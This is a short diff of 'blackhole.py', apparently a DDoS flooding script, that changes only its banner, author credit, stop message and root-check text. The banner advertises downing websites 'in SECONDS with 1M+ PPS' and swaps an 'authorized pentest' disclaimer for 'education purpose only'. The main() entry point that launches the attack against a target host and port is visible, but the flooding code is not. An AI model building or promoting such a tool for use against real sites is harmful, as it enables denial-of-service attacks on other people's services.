@@ -170,10 +170,10 @@ def main():
     args = parser.parse_args()
     
     print("""
-    ╔══════════════════════════════════════════════════════╗
-    ║  🔥 BLACKHOLE DDoS - AUTHORIZED PENETEST ONLY 🔥    ║
-    ║  ⚠️  Downs websites in SECONDS with 1M+ PPS!      ║
-    ╚══════════════════════════════════════════════════════╝
+    ╔══════════════════════════════════════════════════════════════════════════════════╗
+    ║  🔥 BLACKHOLE DDoS - Silent Professor ⚔ Er. Rahul Kumar Jha, B.E, CCEP, CRTOM 🔥 ║
+    ║  ⚠️  Downs websites in SECONDS with 1M+ PPS 🛡 For Education Purpose only        ║
+    ╚══════════════════════════════════════════════════════════════════════════════════╝
     """)
     
     blackhole = BlackholeDDoS(args.target, args.port, args.threads, args.duration)
@@ -181,7 +181,7 @@ def main():
     try:
         blackhole.attack()
     except KeyboardInterrupt:
-        blackhole.log("⏹️ EMERGENCY STOP")
+        blackhole.log("⏹️ EMERGENCY STOP using Ctrl + C")
     
     # Final report
     total_time = time.time() - blackhole.stats.get('start_time', 0)
@@ -190,7 +190,7 @@ def main():
 
 if __name__ == "__main__":
     if os.geteuid() != 0:
-        print("❌ RUN AS ROOT: sudo python3 blackhole.py")
+        print("❌ RUN AS ROOT: 👉 sudo python3 blackhole.py 🏆")
         sys.exit(1)
     
     main()
